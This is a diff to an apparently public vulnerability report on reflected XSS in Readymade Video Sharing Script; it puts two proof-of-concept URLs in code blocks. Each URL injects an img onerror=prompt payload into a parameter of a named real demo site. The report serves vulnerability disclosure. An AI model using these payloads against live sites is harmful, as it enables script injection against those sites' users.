@@ -7,12 +7,15 @@ Well,  when I pentest the official demo site of Readymade Video Sharing Script, 
 
 ##### Reflect-XSS
 
+```
 http://www.smsemailmarketing.in/demo/videosharing/search_video.php?search=123%27123%22123%3E123%3Cimg%20src=x%20onerror=prompt(/xss/)%3E123%3C123%27%22
-
+```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/xss1.png)
 
+```
 http://www.smsemailmarketing.in/demo/videosharing/viewsubs.php?chnlid=123%27123%22123%3E123%3Cimg%20src=x%20onerror=prompt(/xss3/)%3E123%3C123%27%22
+```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/xss2.png)
 
